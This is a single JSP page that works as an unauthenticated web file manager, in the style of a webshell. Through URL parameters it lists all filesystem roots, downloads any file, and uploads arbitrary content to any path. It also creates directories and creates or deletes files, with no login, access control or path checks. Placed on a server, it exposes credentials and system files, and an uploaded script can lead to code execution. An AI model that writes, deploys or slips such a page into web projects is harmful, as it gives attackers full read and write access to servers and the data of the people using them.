<%@ page language="java" import="java.util.*,java.io.*,javax.servlet.jsp.*,java.net.*,java.sql.*" pageEncoding="UTF-8"%><%
	response.setHeader("Cache-Control","no-cache"); //HTTP 1.1
	response.setHeader("Pragma","no-cache"); //HTTP 1.0
	response.setDateHeader ("Expires", 0); //prevents caching at the proxy server

    //download file
    String download = request.getParameter("download");
    if(null!=download)
    {
    	download(request,response,download);
    	return;
    }
	//upload file
	String upfile = request.getParameter("upfilename");
	if(null != upfile)
	{
		String msg = upload(request.getParameter("wizard"),request.getParameter("upfilename"),request);
		if(msg!=null)
			out.println(msg);
		return;
	}
	String dirname = request.getParameter("dirname");
	if(dirname != null){
		boolean result = mkDir(request.getParameter("wizard"), dirname);
		if(!result)out.println("Make dir failed.");
	}
	String filename = request.getParameter("filename");
	if(filename != null){
		boolean result = createFile(request.getParameter("wizard"), filename);
		if(!result)out.println("Create file failed.");
	}
	String deleteFile = request.getParameter("deleteFile");
	if(deleteFile != null){
		boolean result = deleteFile(request.getParameter("wizard"), deleteFile);
		if(!result)out.println(deleteFile + " file delete failed.");
	}
%><%!
	private void printTabularFileInfo(File afile[], String s, PageContext pageContext) throws IOException
    {
        JspWriter jspwriter = pageContext.getOut();
        String s1 = "#FFFFFF";

        boolean flag1 = false;
        File afile1[] = afile;
        if(afile1 != null)
        {
        	boolean flag = false;
            if(afile1.length >= 1)
            {
                flag = afile1[0].getParent() == null;
                if(!flag)
                    Arrays.sort(afile1, COMPARATOR);
            }
            for(int i = 0; i < afile1.length; i++)
            {
                File file = afile1[i];
                String s3 = "";
                if(!flag)
                    s3 = file.getCanonicalPath();
                else
                    s3 = file.getPath();

                flag1 = true;
                jspwriter.print("<tr bgcolor='" + s1 + "'><td width='25' align='center' valign='middle'>"+(i+1));
                jspwriter.print("</td><td width='475' align='left' valign='middle' >");
                if(file.isFile())
                {
                	String s4 = s3;
                    jspwriter.print("[<a href='" + s + "?" + "wizard=" + encode(getPathName(s4)) + "&download="+encode(s4)+"'>down</a>] "+file.getName());
                } else
                if(flag || file.isDirectory())
                {
                    String s5 = file.getName();

                    if(s5.equals(""))
                        s5 = file.getPath();
                    boolean flag3 = isEmptyDir(file);
                    /*if(flag3)
                    	jspwriter.print(s5);
                    else */
	                	jspwriter.print("<a href='" + s + "?" + "wizard=" + encode(s3) + "'>" + s5 + "</a>" + (flag3?" (EMPTY)":""));
                }
                jspwriter.print("</td><td align='left' valign='middle'>");
                if(file.isFile())
                {
                	jspwriter.print(file.length());
                }
                jspwriter.print("</td><td align='left' valign='middle'>");
                jspwriter.print(new Timestamp(file.lastModified()));
                jspwriter.print("</td>");
                jspwriter.print("<td align='left' valign='middle'>");
                if(file.isFile())
                {
                	jspwriter.print("[<a href='javascript:deleteFile(\""+file.getName()+"\")'>delete</a>]");
                }
                jspwriter.print("</td>");
                jspwriter.print("</tr>");
                s1 = switchBackGround(s1);
            }
        }
        if(!flag1)
            printEmptyMessage(pageContext);
    }
    private String encode(String url) throws IOException
    {
    	if(url == null)return url;
		return URLEncoder.encode(url,"UTF-8");
    }

    private boolean isEmptyDir(File file)
    {
        if(file.getParent() == null)
            return false;
        File afile[] = file.listFiles();
        if(afile == null || afile.length == 0)
            return true;
        for(int i = 0; i < afile.length; i++)
        {
            File file1 = afile[i];
            if(file1.isDirectory())
                return false;
        }
        return false;
    }

    public boolean isUnix()
	{
		return separator == '/';
	}

    private static String switchBackGround(String s)
    {
        if(s.equals("#FFFFFF"))
            return "#E0E0E0";
        else
            return "#FFFFFF";
    }

    private void printEmptyMessage(PageContext pageContext) throws IOException
    {
        JspWriter jspwriter = pageContext.getOut();
        jspwriter.print("<tr><td>");
        jspwriter.print("&nbsp;");
        jspwriter.println("</td></tr>");
    }

    static class FileAndDirectoryComparator implements Comparator
	{
	    public FileAndDirectoryComparator(){}

	    public int compare(Object obj, Object obj1)
    	{
        	if(!(obj instanceof File) || !(obj1 instanceof File))
            	return 0;
	        File file = (File)obj;
    	    File file1 = (File)obj1;
        	if(file.isDirectory() && !file1.isDirectory())
            	return -1;
	        if(file1.isDirectory() && !file.isDirectory())
    	        return 1;
        	else
            	return file.compareTo(file1);
    	}
	}

	private void download(HttpServletRequest req, HttpServletResponse res,String sourceFilePathName)throws ServletException, IOException
	{
        FileInputStream fileIn = null;
        try {
        	res.setContentType("application/x-msdownload");
	        res.setHeader("Content-Disposition", "attachment;filename=" + getFileName(sourceFilePathName));

        	int readBytes = 0;
        	int totalRead = 0;
        	int blockSize = 65000;

            File file = new java.io.File(sourceFilePathName);
            fileIn = new FileInputStream(file);
            long fileLen = file.length();
            //res.setContentLength((int)fileLen);
            byte b[] = new byte[blockSize];
            while((long)totalRead < fileLen)
            {
                readBytes = fileIn.read(b, 0, blockSize);
                totalRead += readBytes;
                res.getOutputStream().write(b, 0, readBytes);
            }
        } catch ( java.io.IOException ex ) {
            res.getOutputStream().println("[Download Error] "+ex.getMessage() );
        } finally {
            if ( fileIn != null) fileIn.close();
        }
	}
	private String getFileName(String filePathName)
	{
		if(filePathName==null)
			return "";
			//throw new IllegalArgumentException("file not found .");
		else{
			int pos = filePathName.lastIndexOf(separator);
			if(pos != -1)
				return filePathName.substring(pos+1,filePathName.length());
			else
				return filePathName;
		}
	}
	private String getPathName(String filePathName)
	{
		if(filePathName==null)
			return "";
		else{
			int pos = filePathName.lastIndexOf(separator);
			if(pos != -1)
				return filePathName.substring(0,pos);
			else
				return filePathName;
		}
	}

	private String upload(String filePath,String fileName,HttpServletRequest request) throws ServletException, IOException
	{
		final int MAX_KB = 300;		//	Max Upload Size in MB
		//
		int formDataLength = request.getContentLength();
		String contentType = request.getContentType();
		int index = contentType.lastIndexOf("=");
		String boundary = contentType.substring(index+1);
	//System.out.println("upload - " + formDataLength + " - " + boundary);
		if ((formDataLength/1024/1024) > MAX_KB)					//	100k
			return "File too large = " + (formDataLength/1024/1024)	+ "MB - Allowed = " + MAX_KB + "MB";

		DataInputStream in = new DataInputStream (request.getInputStream());
		byte[] data = new byte[formDataLength];
		int bytesRead = 0;
		int totalBytesRead = 0;
		while (totalBytesRead < formDataLength)
		{
			bytesRead = in.read(data, totalBytesRead, formDataLength);
			totalBytesRead += bytesRead;
		}

		//	Convert to String for easy manipulation
		String m_requestDataString = new String (data, "ISO-8859-1");
		if (m_requestDataString.length() != data.length)
			return "Internal conversion Error";

		//	File Name:
		//	Content-Disposition: form-data; name="file"; filename="C:\Documents and Settings\jjanke\My Documents\desktop.ini"
		index = m_requestDataString.indexOf("filename=\"");
		String m_fileName = m_requestDataString.substring(index+10);
		index = m_fileName.indexOf('"');
		if (index < 1)
			return "No File Name";
		m_fileName = m_fileName.substring(0, index);
	//System.out.println("upload - " + m_fileName);


		//	Content:
		//	Content-Disposition: form-data; name="file"; filename="C:\Documents and Settings\jjanke\My Documents\desktop.ini"
		//	Content-Type: application/octet-stream
		//
		//	[DeleteOnCopy]
		//	Owner=jjanke
		//	Personalized=5
		//	PersonalizedName=My Documents
		//
		//	-----------------------------7d433475038e
		int posStart = m_requestDataString.indexOf("filename=\"");
		posStart = m_requestDataString.indexOf("\n",posStart)+1;	//	end of Context-Disposition
		posStart = m_requestDataString.indexOf("\n",posStart)+1;	//	end of Content-Type
		posStart = m_requestDataString.indexOf("\n",posStart)+1;	//	end of empty line
		int posEnd = m_requestDataString.indexOf(boundary, posStart)-4;
		int length = posEnd-posStart;
		//
	//System.out.println("uploadFile - Start=" + posStart + ", End=" + posEnd + ", Length=" + length);

		//	Final copy
		byte[] m_data = new byte[length];
		for (int i = 0; i < length; i++)
			m_data[i] = data[posStart+i];
		
		FileOutputStream bw = new FileOutputStream(new java.io.File(filePath+separator+fileName));
		bw.write(m_data);
		bw.flush();
		bw.close();
		return null;
	}
	
	private boolean mkDir(String path, String dirname){
		File file = new File(path + separator + dirname);
		return file.mkdirs(); 
	}
	private boolean createFile(String path, String filename) throws Exception {
		File file = new File(path + separator + filename);
		return file.createNewFile();
	}
	private boolean deleteFile(String path, String filename) throws Exception {
		File file = new File(path + separator + filename);
		return file.delete();
	}

	private static final Comparator COMPARATOR = new FileAndDirectoryComparator();
	private static final char separator = File.separatorChar;

%><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv='Cache-Control' content='public'>
<style type='text/css' media='screen'>
BODY {
	FONT-FAMILY:Arial,Helvetica,Tahoma,Verdana,sans-serif;
	BACKGROUND-COLOR: #ffffff
}
A:link {
	COLOR: #0000aa;
	FONT-FAMILY:Arial,Helvetica,Tahoma,Verdana,sans-serif;
	FONT-SIZE: 100%;
}
</style>
  <body>
  <iframe name="myframe" src="blank.html" style="border:0;height:0;width:0;padding:0;position: absolute;"></iframe>
  <form enctype="MULTIPART/FORM-DATA" method="post" name="uploadform" action="" target="myframe">  
	<input type="file" name="uploadfile"/><input style="font-size: 10px" type="button" onclick="upload();" value="Upload"/>
	<input style="font-size: 10px" type="button" onclick="refresh();" value="Refresh"/>
	<input style="font-size: 12px" type='text' name='sname'/><input style="font-size: 10px" type='button' onclick="mkDir()" value='Make Dir'/>
	<input style="font-size: 10px" type='button' onclick="createFile()" value='Create File'/>
  </form>
<%
	String mBasePath = null;
	mBasePath = request.getParameter("wizard");
	
	boolean isUnix = isUnix();
	if(!isUnix && mBasePath == null){
		//mBasePath = "C:\\";
	}

	String url = request.getRequestURL().toString();
	out.println("<a href='"+url+"'>"+request.getServerName()+"</a>");
	
	File afile[] = null;
	if(mBasePath == null || mBasePath.equals(File.separator) && !isUnix)
    {
    	afile = File.listRoots();
	} else
	{
		File file = new File(mBasePath);
        afile = file.listFiles();

        int pos = mBasePath.indexOf(separator);
	    String tmp = mBasePath;
	    String tmp1 = null;
	    out.println(" / ");
		for(;;)
	    {
    		if(pos==-1){
		    	out.println(tmp);
    			break;
    		}else{
    			tmp1 = (tmp1==null?"":tmp1+separator)+tmp.substring(0,pos);
    			tmp = tmp.substring(pos+1,tmp.length());
    			out.println("<a href='"+url+"?wizard="+encode(tmp1)+"'>"+tmp1.substring(tmp1.lastIndexOf(separator)+1,tmp1.length())+"</a>");
    			pos = tmp.indexOf(separator);
    			out.println(" / ");
    		}
    	}
	}
    out.println("<br>");
    //out.println(request.getRequestURI()+","+request.getServerName()+","+request.getRemoteAddr());
	out.flush();
%>
  <table>
<%	
    printTabularFileInfo(afile,url,pageContext);
%>
  </table>
  </body>
</html>
<script language="javascript"> 
function upload()
{
	var upfile = document.all.uploadfile.value;
	if(upfile=='')return;
	else{
		alert(getFileName(upfile));
		var url = '<%=url%>'+'?upfilename='+getFileName(upfile)+'&wizard=<%=encode(mBasePath)%>';
		document.uploadform.action=url;
		document.uploadform.submit();
	}
}
function refresh(){
	window.location = '<%=url%>?wizard=<%=encode(mBasePath)%>';
}
function getFileName(url)
{
	var pos = url.lastIndexOf('\\');
	return url.substring(pos+1,url.length);
}
function mkDir(){
	var dirname = document.all.sname.value;
	var url = '<%=url%>?wizard=<%=encode(mBasePath)%>&dirname='+ dirname;
	document.uploadform.action=url;
	document.uploadform.target="";
	document.uploadform.submit();
}
function createFile(){
	var filename = document.all.sname.value;
	var url = '<%=url%>?wizard=<%=encode(mBasePath)%>&filename='+ filename;
	document.uploadform.action=url;
	document.uploadform.target="";
	document.uploadform.submit();
}
function deleteFile(filename) {
	if(confirm("Do you want to delete file '"+filename+"' ?")){
		window.location = '<%=url%>?wizard=<%=encode(mBasePath)%>&deleteFile='+ filename;
	}
}
</script>